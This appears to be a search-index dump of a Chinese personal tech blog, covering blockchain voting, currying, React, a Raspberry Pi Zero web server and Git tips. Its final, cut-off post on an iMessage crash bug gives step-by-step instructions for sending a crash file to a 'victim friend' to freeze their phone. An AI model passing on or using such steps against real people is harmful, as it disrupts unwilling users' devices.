账本。\n什么是账本？实际上就是银行的这笔交易的流水，在你用银行卡划卡支付的过程中，实际上是顾客和商家都信任银行，认为银行记下来的这个账是正确无误的，并且银行也把顾客的钱减少了，把商家的钱增加了。那么这个记账的媒介，该笔账单，可以说是账本的一部分。\n如果你的银行账户消费的内容足够多，那么这就是一个账本，上面记录着你的所有的交易信息，交易信息和你的账户余额的值一一对应，在这种情况下，你相信银行，你相信账本，银行作为第三方支付方式，你也就自然就信任了。\n可是我为什么要提出账本的概念呢？\n区块链就是一个分布式的公共记账账本。凡是下载了比特币(或XX币，我这里用比特币举例)的客户端的人，都会自动下载这个账本，这个账本储存着全球所有人的通过比特币交易信息。这个信息只能增加，不可以删除、修改，否则就无法解决同步的问题。\n那么我们就可以理解区块链，就是一个分布式的不可删改的数据库，现在理解了吧？\n回归正题，为什么要用区块链，因为区块链的广播机制是通过比特币进行交易而储存的，每个交易中都会有一个东西叫做附言(OP_RETURN)，在附言位置可以留自己的转账信息比如：\n\n哈，这笔交易你收好！是小明转给你的\n\n这个信息是随意的，可以写任何东西。\n真实的例子 附言内容是 haha\n那么聪明的人来了，这段信息是不是可以用来储存东西，虽然有容量限制，但是储存的东西就是永久的不会被更改的。\n不错，我创建一个公共的计票的比特币的账户，并且公开地址，每个投票者对这个地址进行转账，并且附上自己的投票信息，比如候选人什么的作为附言，然后进行转账，内容就是相当于“发布到了区块链”上了。\n\n区块链技术基于去中心化的对等网络，用开源软件把密码学原理、时序数据和共识机制相结合，来保障分布式数据库中各节点的连贯和持续，使信息能即时验证、可追溯、但难以篡改和无法屏蔽，从而创造了一套隐私、高效、安全的共享价值体系。\n\n高判立下，这样每个投票者的投票信息就是公开的可以验证的，但是又由于比特币地址本身具有匿名性，谁也不知道发布投票信息的人是谁，这又符合了隐私性。\n你看，是不是完美了？\n为什么用环签名不是，并不完美。\n为什么？\n那在这种情况下，岂不是任何人都可以投票了，不经过投票中心认证的人，都可以瞎投，扰乱视听，而且投票者无法验证整体性。\n没错，这个时候伟大的环签名来了。\n在理解环签名之前，你需要对密码学的签名机制有所了解，如果不了解，请点击这里。\n环签名，实际上是一种特殊的群签名。你不用理解什么是群签名，只需要听我继续往下讲什么是环签名。\n\n\n你看，我附了一个山东大学一个优秀的博士论文截图，是不是瞬间就显得高大上？\n其实也没有什么的。\n环签名是对一个特定的内容进行签名。\n在签名之前，所有人围城一个环，每个人生成一个自己的私钥Si，并且告诉其他人自己的公钥(P1,P2,P3…Pn)。\n接下来就是开始签名，每个人用自己的私钥Si和所有人的公钥(P1,P2,P3…Pn)对内容m进行签名，可以得到签名s。\n注意：\n\n每个人的得到的签名都是不一样的\n签名的长度取决于公钥的个数\n\n这样，我们把m替换为我们的投票内容，这样就可以在组织投票之前，对能够投票的人进行圈定，只有在这个圈子里的人才能投票。\n环签名具有天然的可验证性，任何人都可以验证自己，只需要根据得到的签名和所有人的公钥就可以得出自己是不是真正的投票了。\n如果把签名信息s也随着信息m一起广播到区块链上，那是不是就能够保障整体验证性与个体验证性？\n好了，我们投票的主要矛盾解决了！现在，真的解决了！\n你可能一句都没看懂我上面在说什么，也可能看懂了一点，没事，摸摸头，是我表达能力太差了，其实都是非常简单的东西。\n具体投票协议我不告诉你哈哈哈哈哈哈，会在九月份公开。\n都是一些数学表达，发了也得花大量篇幅去解释，费劲。\n因为内容可能会查重，即使是中文版本现在我也不想发。\n技术栈\n后端语言：PHP\n后端数据库：MySQL\n区块链：比特币BTC/比特币测试网络TESTNET\nPHP MVC 框架：Slim\nPHP DAO 框架：Illuminate Database\nPHP 依赖管理： Composer\nPHP 模板引擎：TWIG\n前端包管理：NPM\n前端CSS预处理器：Sass\n前端代码打包工具：Gulp\n前端预编译器：browserify\n版本控制：Git\n说句实话，技术挺复杂的，用到了很多第三方类库、框架、工具，感谢很多第三方类库的帮助，在我写代码的时候，也发现了一个第三方类库的Bug，并随手修复了，也算是对开源社区的回馈吧。\n\n关于开源项目会开源的，我知道，区块链最近创业很多，我的这个项目也可以用来创业，但是我根本不在乎这些金钱的东西，我更享受开源所带来的快感。\n但是如果拿去用来做商业用途，我还是很不爽的，所以我的这个项目禁止用于商业用途，但是非营利用途都是可以的。\n截图可能不是最终版，先尝鲜一下\n\n\n\n\n\n\n\n\n\n\n本文参考文献[1] Jonker H, Mauw S, Pang J. Privacy and verifiability in voting systems: Methods, developments and trends[J]. Computer Science Review, 2013, 10:1-30.\n[2] 张江霄, 李舟军, 刘霞,等. 基于群盲签名的多授权电子投票系统[J]. 中国科技论文, 2015(8):980-983.\n[3] Mercer R. Privacy on the Blockchain: Unique Ring Signatures[J]. 2016.\n","categories":["Blockchain"],"tags":["Blockchain"]},{"title":"拍拍哒投资平台","url":"http://www.yfgeek.com/2017/06/26/拍拍哒投资平台/","content":"本文是近期状况的一些小记录，无技术探讨。\n最近参加了一个小比赛，第二届魔镜杯数据应用大赛，大概就是做一个金融数据产品，用了两天码了一些代码，还是学习到了一些知识。\n至少学到了怎么在前端获取标准的oAuth，其实很简单，事情实践起来总是好的。\n至于开发语言方面，本来是想用python的，后来因为工期紧，就用Thinkphp改了改，事实上发现，之前做的任何事情都是有用的。\n具体做了两个平台：\n模拟平台——从已有的数据库读取数据，供用户学习\n投资平台——获取真实数据，实时分析，真实交易\n在这期间，做了这些工作：\n\n完整的用户登录、注册逻辑\n集成拍拍贷SDK到框架里，依赖RSA算法\n可以通过拍拍贷的OAuth授权到用户上\n不同用户可以储存不同的token信息\n构建了一个API用于读取特定的信息，可以批量读取投资信息\n构建了一个API用于读取单个的信息\n真实的模拟投资系统，根据日期的变化，改变可选投资项\n真实的投资功能\n数据可视化\n用缓存机制存储分析数据，高效快速\n基于神经网络算法进行逾期率预测\n\n截图\n\n\n\n\n\n\n\n","categories":["Web"],"tags":["Web"]},{"title":"揭秘utf8=✓背后的小秘密","url":"http://www.yfgeek.com/2017/02/17/揭秘utf8-✓背后的小秘密/","content":"你可能和我一样疑惑，为什么github等网站，在POST数据的时候，经常带有utf8=✓字符，显然这种方式看起来很难以接受，因为Unicode编码错误的话会导致很多问题，毕竟用户的浏览器是不一样的。\n为什么不用utf8=true来代替呢？\n答案恰恰相反！\nutf8=✓就是为了让浏览器在POST数据时强制使用utf-8的编码方式，进而在后端代码中无需考虑字符串编码转换问题，以免带来困扰。\n在IE8，或者更早的IE浏览器里，在POST数据时，会尽可能的POST以Latin-1编码方式的字符串，这给后端带来了巨大的兼容性的困扰，但是你一旦在POST数据中包含了✓这样的Unicode字符，就会自动用uft8的编码方式发送字符串。\n是不是很有用的小技巧呢？\n本文翻译自:Is the use of “utf8=✓” preferable to “utf8=true”?\n","categories":["Web"],"tags":["Web"]},{"title":"浅谈函数式编程柯里化","url":"http://www.yfgeek.com/2017/02/11/函数式编程柯里化/","content":"百度百科里对柯里化的定义是\n\n在计算机科学中，柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术。这个技术由 Christopher Strachey 以逻辑学家 Haskell Curry 命名的，尽管它是 Moses Schnfinkel 和 Gottlob Frege 发明的。\n\n简直看不懂哦，Talk is Cheap，我们拿一个简单的haskell程序说明什么叫\n自动柯里化两数相加，返回结果：\nfun add x y = x + y\n\n这是一个典型的柯里化的版本，当我输入 (add 1) 2 时与add 1 2 的返回结果一模一样，都是3\nPrelude&gt; (add 1) 23\n\n但是，换个角度上讲，我明明设置了两个“变量”，在haskell里却把它们的结果又封装成了一个函数，这就是haskell的强大特性：自动柯里化，haskell全部帮你自动处理了。\n简单来说，柯里化指的是函数里只接收一个余下的参数，再调用原函数，返回出相应的结果。\n而同样的，没有柯里化的普通版本却是这样的：\nfun add(x, y) = x + y\n\n这个版本里，只能通过add(1,2)进行相加操作。\n柯里化实际上是将高阶函数进行降阶处理，没理解？接着看~ \nJavaScript的柯里化JavaScript存在闭包的特性，能够很好的为我们将函数柯里化，但是很可惜JavaScript不支持自动柯里化，这意味着，我们要自己写柯里化的过程，不过还好，这能有效的让我们理解，到底什么是柯里化。\n同样的，还是那个add的简单函数，用JavaScript实现如下：\nfunction add(x, y)&#123;\tif(y===undefined)&#123;\t\treturn (z) =&gt; x + z;\t&#125;else&#123;\t\treturn x+y;\t&#125;&#125;\n\n测试一下！通过执行add(1)(2)，果然返回了3，是的，这是一个手动构造柯里化函数的过程。对于大多数函数，我们有通用的柯里化方法：\nfunction curry(func) &#123;  var fixedArgs = [].slice.call(arguments,1);  return function() &#123;    args = fixedArgs.concat([].slice.call(arguments))    return func.apply(null, args);  &#125;;&#125;\n\n也就是说，对于add函数来说，我们用一个函数生成了另一个范围更小的函数，一层接一层的解决问题。这符合函数式编程的思想，就是我们更关注函数与函数之间的关系，而非状态本身，更在乎局部而非整体。\n这个例子体现不出这种思想的精妙之处，那么我们再举一个例子🌰\n如果，我们想让一个已知的数组每个值都做加1操作，传统的方法该怎么做？\nlet ar = [1,2,3];ar.map((x)=&gt; x+1);\n\n对吧？那么我们下面可以用柯里化的思想把这个问题实现：\nconst add = ar =&gt; ar.map(x =&gt; x + 1);add([1, 2, 3]);\n\n首先我们在add里定义了一个函数，并且传入参数为ar，ar进行Array.prototype.map()操作，对每一个数进行遍历，并且返回这个数字+1后的值给ar，这看起来挺玄乎的，但确实可行，我们只关心局部，请试图把add当做数学里中的函数去思考理解，或许会好懂的多。可是这只是方便了我们理解，那么到底有什么好处呢？\n再举一个例子🌰\n如果我们想写一个函数，用来对已知数组的已知量进行相加n的操作，怎么写？传统方法\nlet ar= [1,2,3];function addToArray(ar,n)&#123;  return ar.map((x)=&gt; x+n)&#125;;console.log(addToArray(ar,1));\n\n但是，我们可以这样写：\nconst add = a =&gt; b =&gt; a+b;const addToArray = (ar,n) =&gt; ar.map(add(n));addToArray([2,3],1)\n\n结果都一样，其实过程是不一样的，你可能真的憋不住了，到底有什么用呢？\n柯里化的好处就像上面的例子一样，你能看出不同吗？对，第一个的实质是新写了一个函数，对数组进行map操作，而第二个则是在直接在map里进行add操作，这很通用，一旦你写了很多类似于add的函数，就会方便起来，可以让我们方便的在map,reduce,filter里调用。\n\n能够进行延迟计算，就像add(1)(2)一样，1比2先传入，2就会被延迟计算，在特定的场景里，有一定的应用意义。\n当你发现你要调用一个函数，并且调用参数都是一样的情况下，这个参数就可以被柯里化，以便更好的完成任务。\n优雅的写法，允许你写出来的代码更干净、更有表达力。\n\n虽然柯里化在日常应用不多，但仍然是一个不可不了解的好概念。\n相关阅读 JavaScript柯里化\nCurrying and ES6 Arrow Functions\n浅析 JavaScript 中的 函数 currying 柯里化\nCurrying - Part 6 of Functional Programming in JavaScript(需梯子)\n","categories":["Web"],"tags":["Web"]},{"title":"什么才是优秀的程序代码","url":"http://www.yfgeek.com/2017/02/08/什么才是优秀的程序代码/","content":"首先，我想说的是，我谈及的“优秀程序代码”，不是指“优秀程序”，也不是更易阅读的“代码”，恰恰相反，我可能想写的是更不易阅读的代码，这里的“优秀”指的是高效、快速。\n在写之前，我想先用一个原则引入这个文章：\n\nKISS原则  *Keep It Simple, Stupid* \n\n是的，这是我心中优秀的代码程序，就是简单、高效。\n相信所有人都知道时间复杂度这个东西，是的，优秀的代码永远都在做一件事：降低时间复杂度，哪怕写的过程是复杂的、理解起来是相对难的(比如，快速排序、堆排序)。那么，我接下来，想较一下真。\n卡常数\n据考证，[卡]（Qa’a）是古埃及第一王朝的最后一位法老。\n他发现并研究了一种常数，后世以他的名字叫做卡常数。卡特兰数的起源也是因为卡的后人与特兰克斯结婚，生下来的孩子就叫卡特兰，而他只是发表了祖传的家书而已。\nSereja也是卡的后人，提出括号序列问题，也是从家书里得到的资料。然而Sereja为了不让这个秘密公开，于是隐瞒了这道题的真正做法。可是由于卡的后人不是各个都像卡特兰一样爱慕虚荣，这一算法也无法找到。“欲见贤人而不以其道，犹欲其入而闭之门也”。卡之常数的奥秘，需要以一颗诚心去追寻。\n\n看不懂对吗？\n我也看不懂，因为这是一群高中生写的。按照我的理解，卡常数，就是内循环里的那些看似不重要的语句其实每一句话的运行速度是不一样的，这个客观规律，是真实存在的，举个栗子🌰\n程序1\nfor (int i = 0; i &lt;= K; i++)  for (int j = 0; j &lt;= K; j++)    for (int k = 0; k &lt;= K; k++) &#123;       r.a[i][j] += a[i][k] * x.a[k][j];      if (r.a[i][j] &gt;= 1ll &lt;&lt; 62 || k == K) r.a[i][j] %= mod;   &#125;\n\n程序2\nfor (int i = 0; i &lt;= K; i++)  for (int j = 0; j &lt;= K; j++)    for (int k = 0; k &lt;= K; k++)      r.a[i][j] = (r. a[i][j] + a[i][k] * x.a[k][j] % mod) % mod; \n\n按照常人的理解，程序1和程序2的复杂度都是O(n^3)，没错，那么他们的时间是一样的吗？\n并不一样。\n在机器性能并没有那么高的情况下，在测试数据量没有那么少的情况下，第二种比第一种快了一倍。\n为什么？\n因为第二种代码更加精炼吗？并不完全是。\n在程序1中， if (r.a[i][j] &gt;= 1ll &lt;&lt; 62 || k == K)实际上是耗费时间的，if操作在执行的时候真实的操作是这样的：\nif(这里面是true吗？)  左边是true吗？  右边是true吗？  ||操作是true吗？\n\n这必然会消耗大量的时间，同理\nr.a[i][j] += a[i][k] * x.a[k][j];r.a[i][j] = a[i][k] * x.a[k][j] + r.a[i][j];\n\n一样吗？实际上是不一样的，后者比前者快一点。\n你可能觉得，这也太较真了吧？但是高效就是高效，效率提高才是硬道理。\n\n不积跬步，无以至千里；不积小流，无以成江海。\n\n原则\n一杆内存在心中\n\n多写一个不必要的循环递归，浑身难受\n\n多写一个不必要的逻辑判断，浑身难受\n\n多写一个无关变量，浑身难受\n\n不找到最优解，浑身难受\n\n始终自发的想着如何用栈、树去解决问题\n\n代码效率哪怕提升的是一倍，花一天优化代码也是值得的\n\n时刻遵循RP定律写代码，RP++\n\n\n我从我接触OI那一刻起，我觉得算法是美的，每一个人写出来的算法都体现了一种算法，永远对高效快速的低复杂度的精炼代码充满敬畏之心！❤️\n","categories":["CodeStyle"],"tags":["CodeStyle"]},{"title":"我眼中的React","url":"http://www.yfgeek.com/2017/02/04/我眼中的React/","content":"前两天，用React把 之前的 基于树莓派3B,DHT11/DHT22,LCD1602的一个实时温度湿度检测系统 的Web部分重构了一下。\n这个项目之前是用Semantic UI + eCharts + JQuery Datapicker写的，由于这个项目的实现过程比较经典，几乎把所有的感觉React的基础思想都实现了一遍。\n无疑，React给前端带来了各种新的想法与思想，声明式、虚拟Dom、单向数据流、JSX、组件化、Flux、以JavaScript为中心、React Native。\n\n虚拟DomReact是以JS为中心的，而非HTML，虚拟Dom是一个至关重要的概念。\n在jQuery出现之前，我们一般都是直接操作Dom，方法“暴力、简单”，也存在兼容性的问题。在jQuery出现之后，jQuery的选择器帮助我们简单、高效的操作Dom，也就是在jQuery出现之后，前端就开始大爆发了。\n但是随着发展，这种简单暴力的操作Dom的方法对于很多大型系统性工程来说，从软件工程的角度上讲，是杂乱、无序的，一旦时间久远，项目越来越大，维护成本就变大。于是，我们有了各种前端MVC、MVVM框架，典型的有Angular、React、vue.js，MVVM给我们带来一种全新的思想，数据绑定。\n不过，与此同时，React给我们带来了一种全新的思想，虚拟Dom，从此，我们再也不用直接操作Dom了，而是用虚拟Dom更新Dom。\n你可能会问，这样做，效率岂不是更低了？\n是的，也不是。其实没有那么明显，一般来讲，操作Dom树的Diff算法应该是O(n^3)，而React把效率降低到了O(n)。\n\n简单来讲，如图所示，React只会比较相同层级的Dom，从而简化了Dom Diff的复杂度，虽然有所舍弃，但是全局比较是没有必要的。\n通过在JSX文件中写虚拟Dom，React在内存中会自动拿现在的虚拟Dom和旧的虚拟Dom进行Diff操作，如果发现有Diff的部分，就拿出来形成新的Patch部分，加入到现在的Dom树上。\n也就是因为这个原因，虚拟Dom使得在操作Dom上更加高效，每次更新数据不会进行O(n^3)复杂的操作。\n你可能会问，什么是JSX？\nJSX其实JSX只是一种未编译的JavaScript，可以方便的对HTML进行书写，先上代码：\nimport React from &#x27;react&#x27;;import &#123; Button &#125; from &#x27;semantic-ui-react&#x27;;class ButtonComponent extends React.Component &#123;    render() &#123;        return(            &lt;span&gt;            &lt;Button color=&#x27;blue&#x27; &gt;分钟&lt;/Button&gt;            &lt;Button color=&#x27;violet&#x27;&gt;小时&lt;/Button&gt;            &lt;/span&gt;        );    &#125;&#125;export default ButtonComponent;\n代码部分用ES6书写，你可能会问什么是ES6？其实还有ES7(ECMAScript 2016)呢~\n那么，你可能看到了很变态的写法，就是HTML和JS混写，没错，这就是EJS，但请注意，这不是HTML，写着写着很有可能会掉入JSX陷阱。\n经过babel等工具的编译后，JSX在运行的时候会被编译为真实的JavaScript语言，之所以这样写，只是为了方便程序员更方便的写代码。\n比如上面的代码“HTML部分”会被编译为：\nReact.createElement(&#x27;button&#x27;, &#123;class: &#x27;ui blue button&#x27;&#125;, &#x27;分钟&#x27;);React.createElement(&#x27;button&#x27;, &#123;class: &#x27;ui violet button&#x27;&#125;, &#x27;小时&#x27;);\n\n当然，JSX也有很多坑，比如：\nModule build failed: SyntaxError: Adjacent JSX elements must be wrapped in an enclosing tag\n作为新手，这个问题，我经常遇到，因为你在写每一个JSX模块的时候，你需要用类似于&lt;div&gt;&lt;/div&gt;作为开始与结尾，不规范的代码不会被编译成功。\nECMAScript(ES)ES无疑是这几年最火的前端语言，没错，他是JavaScript的改进版，我知道，其实还有很多其他类似的比如CoffeeScript，但是ES会被各大浏览器所兼容支持，但是你可能会问到兼容性问题，没事，我们有babel工具。\n\nECMAScript：一个由 ECMA International 进行标准化，TC39 委员会进行监督的语言。通常用于指代标准本身。\nJavaScript：ECMAScript 标准的各种实现的最常用称呼。这个术语并不局限于某个特定版本的 ECMAScript 规范，并且可能被用于任何不同程度的任意版本的 ECMAScript 的实现。\nECMAScript 5 (ES5)：ECMAScript 的第五版修订，于 2009 年完成标准化。这个规范在所有现代浏览器中都相当完全的实现了。\nECMAScript 6 (ES6) / ECMAScript 2015 (ES2015)：ECMAScript 的第六版修订，于 2015 年完成标准化。这个标准被部分实现于大部分现代浏览器。可以查阅这张兼容性表来查看不同浏览器和工具的实现情况。\nECMAScript Proposals：被考虑加入未来版本 ECMAScript 标准的特性与语法提案，他们需要经历五个阶段：Strawman（稻草人），Proposal（提议），Draft（草案），Candidate（候选）以及 Finished （完成）。\nECMAScript 2016：第七版 ECMAScript 修订，增加了两个新特性。\n\n以上，都是我们常说的ES，在网上看到的代码目前以ES5和ES6居多，写法各异，我建议用最新版的写法写代码。\n说白了，就是Javascript并不是一个优秀的语言，但是经过不断的填补，修正，已经让Javascript支持了很多新特性，新的语法，更多的书写方式，以及拥有了更严谨的编程思想。比如let,arrow function(就是这个：(i) =&gt; i + 1 )在ES中的运用等。\n所以，在认识React之前，最好学习ES的新特性以及常用的新特性。\n组件化我觉得这是React的重量级思想，组件化前端，从此，前端再也不是东拼西凑，而是像积木一样，拼起来。\n\nReact把单一的用户界面，拆成了各种各样的组件，形成“组件树”，采用分而治之的思想，有一个好处，就是维护起来极其方便，对于组件的修改也显得很容易。\n数据绑定众所周知，Angular是双向数据绑定的，并且引以为豪，因为更容易维护与理解。\n但是双向数据绑定也带来了许多问题，会在些其他功能的时候莫名其妙出现很多bug。\nReact是单向数据绑定的，是非常稳定的做法，但是也存在一些问题，就是在操作其他组件的时候，对于数据流的处理，显得异常困难。\n在React中，数据绑定仅仅需要在render中写&#123;数据绑定&#125;，而非像Angular一样，两边都要设置，一定情况下讲，这是比较方便的。\n数据模型state话说回来，React的每一个组件的实质是什么？状态机（State Machines），在React的每一个组件里，通过更新this.state，再通过render()进行渲染，React会自动把最新的状态渲染到网页上。\n举个栗子🌰\nclass DateSelectorComponent extends Component &#123;    constructor(props) &#123;    super(props);    let todaydate = this.showLocale(new Date());     this.state = &#123;         timenow: todaydate,         showCalendar: false    &#125;            return(            &lt;div&gt;            &lt;Input icon=&#x27;calendar&#x27; iconPosition=&#x27;left&#x27; readOnly onClick=&#123;this.showCalendar&#125; value=&#123;this.state.timenow&#125; ref=&quot;inputbox&quot;/&gt;            &lt;ButtonComponent /&gt;            &#123;CalendarComponent&#125;            &lt;/div&gt;        )&#125;\n通过这样的方式，我就设置了state的默认初始值，默认日历选择器是不出现的，而今天的日期是今天日期，这很正常。然后在将所谓的值渲染到Dom上。\npropsReact的数据流是单向的，是自上向下的层级传递的，props可以对固定的数据进行传递。\nclass HelloMessage extends Component &#123;  render(     return &lt;h1&gt;Hello &#123;this.props.name&#125;&lt;/h1&gt;;    )&#125;class MainPage extends Component &#123;render()&#123; return(  &lt;HelloMessage name=&quot;John&quot; /&gt;  ) &#125;&#125;\n在这种情况下，子组件会自动读取出父组件传递过来的props值John，并快速的渲染在页面上。\n到底谁是谁state和props看起来很相似，其实是完全不同的东西。\n\n\n\n问题\nprops\nstate\n\n\n\n\n可以从父组件得到初始值吗？\n可以\n可以\n\n\n\n可以被父组件改变值吗？\n可以\n不可以\n\n\n\n可以设置组件内部的初始值吗？\n可以\n可以\n\n\n\n可以改变组件内部的初始值吗？\n不可以\n可以\n\n\n\n可以设置子组件的初始值吗？\n可以\n可以\n\n\n\n可以改变子组件的初始值吗？\n可以\n不可以\n\n\n\n按照我的个人理解，props是静态的，存入不变量，比如 购物车里的 商品名称、价格；state是动态的，存入随时变化的量，比如 用户购买商品的总价，购买数目。\n从操作的角度上讲，props是单向传递的，会一直被传递到子组件，而state更倾向于自身，只能改变自身的值。\n获取Domthis.refs是react的重要组成之一，通过该方法可以快速高效的获取Dom。\n例如，在JSX代码中这样写道\n&lt;input ref=&quot;myInput&quot; /&gt;\n便可以通过\nthis.refs.myInput.value\n命令获取该Input下的dom属性的value值，非常方便。\n生命周期组件都是有生命周期的，生命周期内，props和state改变会导致React自动用Diff算法重新渲染页面。那么生命周期到底都有哪些呢？\n大体上分为三类：\n\n挂载： 组件被插入到DOM中。\n更新： 组件被重新渲染，查明DOM是否应该刷新。\n移除： 组件从DOM中移除。\n\n从流程上讲，是这样的：\n挂载期：\ngetInitialState() –&gt;&gt; componentWillMount() –&gt;&gt; render() –&gt;&gt; componentDidMount()\n更新期：\ncomponentWillReceiveProps() –&gt;&gt; shouldComponentUpdate() –&gt;&gt; componentWillUpdate render() –&gt;&gt; componentDidUpdate()\n移除期：\ncomponentWillUnmount()\n挂载**componentWillMount()**： 在初次渲染之前执行一次，最早的执行点\n**componentDidMount()**： 在初次渲染之后执行，比较常用，比如持续执行某事件：\ncomponentDidMount()&#123; setInterval(this.loadData(this.state.date),1000);&#125;\n\n更新**componentWillReceiveProps()**： 在组件接收到新的 props 的时候调用。在初始化渲染的时候，该方法不会调用。\n**shouldComponentUpdate()**： 在接收到新的 props 或者 state，将要渲染之前调用。\n**componentWillUpdate()**： 在接收到新的 props 或者 state 之前立刻调用。\n**componentDidUpdate()**： 在组件的更新已经同步到 DOM 中之后立刻被调用。\n移除**componentWillUnmount()**： 在组件从 DOM 中移除的时候立刻被调用。\nFluxReact是MVC中V的一部分，而Flux则是M和C的部分，Flux是单向数据流，符合React的核心思想，不过，Flux并不完善，是一个很松散的架构。\n\nDispatcher： 处理动作分发，维护 Store 之间的依赖关系\nStore： 数据和逻辑部分\nView： React 组件，这一层可以看作 controller-views，作为视图同时响应用户交互\nAction： 提供给 Dispatcher 传递数据给 Store\n\n\nRedux\nFlux把总架构都搭好了，可是实现起来并不容易，因为Flux并没有强大的API，只是一种纯粹的思想实现，而Redux是Flux的“升级版”，把各个部分更加方便的实现起来。\n此部分未完待续\n总结我觉得React给前端开发带来了一种全新的思想，那就是以JS为中心，一种全新的世界。\n网页不再是网页，而是像工程一样，一块块搭建起来的，拆下来，搬上去都很容易，似的前端再也不是那个凌乱拼凑的年代。\n我想任何一种编程语言，无论是解释性、脚本、编译语言都逃离不了这个全新的年代，就是组件化，大家似乎都在不同方向发展，但实际上，确实一样的。\n相关阅读深入浅出React（四）：虚拟DOM Diff算法解析\nReact/React Native 的ES5 ES6写法对照表\nReact组件声明周期过程说明\n","categories":["Web"],"tags":["Web"]},{"title":"用Raspberry Pi Zero打造“即插即用”的Web服务器","url":"http://www.yfgeek.com/2017/01/12/用Raspberry-Pi-Zero打造“即插即用”的服务器/","content":"虽然Raspberry Pi Zero只有4.5英镑，非常便宜，但确实具有局限性，由于缺少网口、WiFi，功能比较单一，可曾设想，用Raspberry Pi Zero打造一个完美的“即插即用”的Web服务器？\n\n何为即插即用？\n类似于优盘一样，插上电脑，等待几秒，直接识别为网卡，直接输入树莓派的网址，连接就是自己的网站。\n有什么用？\n实现本地web本地化，随着前端、后端技术的发展，web应用越来越多，但是web应用受制于网络的限制，一旦没有网络，就没有用武之地。\n那么为什么不把web本地化呢？以后拿着“即插即用”的服务器，到任何电脑上，都能随时办公。\n安装我们可以把树莓派虚拟为网卡，然后在内网连接它。\n1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：\ndiskutil listdiskutil unmountDisk /dev/SD卡的标号 #如disk2cd /Users/ivan/Downloads/2016-11-25-raspbian-jessie #进入目录sudo dd bs=1m if=2016-11-25-raspbian-jessie.img of=/dev/rdisk2\n2.刷好系统后编辑config.txt文件，在最后一行下，另起一行添加：\ndtoverlay=dwc2\n保存文件\n3.最后，打开cmdline.txt文件。找到单词rootwait，在其之后添加：\nmodules-load=dwc2,g_ether\n\n4.添加一个文件名为ssh到根目录下，内容为空\n5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。\n\n6.Ping 一下raspberrypi.local看是否能通\nPING raspberrypi.local (169.254.70.245): 56 data bytes64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms\n\n\n配置1.ssh连接raspberrypi.local，默认密码为raspberry\npi@raspberrypi.local\n\n2.通过直接运行raspi-config命令\n你需要做\n\n容量扩展\n更改系统时区\n更改系统密码\n\n3.同时你需要通过执行sudo passwd root更改root密码\n4.在本机设置代理\n首先，设置本机名为Mac，在本机搭建一个squid，为了使树莓派安装web server，以后日常使用不需要。\nbrew updatebrew install squid\n5.然后下载SquidMan，安装。在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。\n6.进入树莓派的shell，输入：\ncd /etc/apt/apt.conf.dsudo vi 50raspi\n最后一行加入一句话：\nAcquire::http::Proxy &quot;http://Mac.local:8080&quot;;\n保存\n7.继续输入apt-get update查看是否有网络。\n8.安装lighthttpd+mysql+php\n输入：\nsudo apt-get install lighttpd mysql-server php5-cgi php5-mysql\n\n等待安装完毕后，修改php.ini设置\nsudo nano /etc/php5/cgi/php.ini\n去掉这一条注释的;\n;cgi.fix_pathinfo = 1\n随后修改lighttpd.conf\nsudo nano /etc/lighttpd/lighttpd.conf\n\n在server.modules中增加fastcgi\nserver.modules = (&quot;mod_access&quot;,&quot;mod_alias&quot;,&quot;mod_compress&quot;,# &quot;mod_redirect&quot;,&quot;mod_fastcgi&quot;,# &quot;mod_rewrite&quot;,)\n最后添加\nfastcgi.server = ( &quot;.php&quot; =&gt; ((    &quot;bin-path&quot; =&gt; &quot;/usr/bin/php5-cgi&quot;,    &quot;socket&quot; =&gt; &quot;/tmp/php.socket&quot;)))\n\n重启lighttpd服务\nsudo /etc/init.d/lighttpd restart\n\n通过scp协议，上传一个index.php文件\n&lt;?phpphpinfo();?&gt;\n删除默认的index.htm文件，打开网站http://自己树莓派名字.local查看是否成功。\n\n不错，接下来的事情，就是把自己的源代码传到树莓派上，不过多叙述。\n多说一句从此以后，你只需要带上你的树莓派Zero就可以随时随地的打开自己的私有web服务。但是，树莓派Zero的性能，确实不行，建议跑一跑小型的程序，不要跑太大的程序。\n\n至于应用嘛，其实做什么都可以的。\n","categories":["Rasberry"],"tags":["Raspberry"]},{"title":"Git 文件、文件夹区分大小写","url":"http://www.yfgeek.com/2017/01/07/Git-文件区分大小写/","content":"其实非常简单，只是提醒一个小常识，Git默认是不区分文件，文件夹大小写的。\n这会给很多人带来很多困扰，比如文件改了名，在严格区分大小写的系统下，实际上是两个不同名字的文件，但是Git不区分大小写机制导致无法正常的commit。\n开启Git区分大小写\ngit config core.ignorecase false\n\n最近爱上了给别人找bug，Pull Request，❤️Github。\n任何细节，都很重要。\n","categories":["Github"],"tags":["Github"]},{"title":"iOS 10 iMessage字符崩溃Bug又来了","url":"http://www.yfgeek.com/2017/01/02/iOS-10-iMessage字符崩溃Bug又来了/","content":"这是一篇本人发表到Freebuf的文章。\n介绍近日，黑客@vincedes3发现了一个从iOS 8 到 iOS 10.2.1 b2通用的iMessage字符崩溃Bug，该Bug同样利用了和当年iOS 8的iMessage短信Bug的类似手法，将一段恶意代码发送给受害者，受害者在接收短信后，浏览短信即可中招，此后短信应用陷入死机状态，除非打开修复网页程序，否则再也无法打开短信应用。\n\n利用1. 下载利用文件 点击这里下载\n2. 把它传到 iCloud Drive, 百度云, 或者任何你能够在iPhone上下载到的地方\n3. 打开这个文件，点击分享，再点击 短信图标\n4. 通过iMessage把这个文件传给你的受害者好友\n5. 等待受害者点开短信，他会中招的\n6. 可以通过这个链接来修复 点我修复\n\ndemo视频\n工作原理在受害者打开短信的时候，触发了大量能够引起短信程序崩溃的字符，当用户浏览该短信的时候，cpu进行了大量的计算直到短信app点不动。当用户关掉短信程序后，再次打开短信程序，系统试图加载上一次内容，依然会触发该bug。\n\nTXT版本的触发代码: http://vincedes3.com/crashtext.txt\nHTML版本的触发代码: 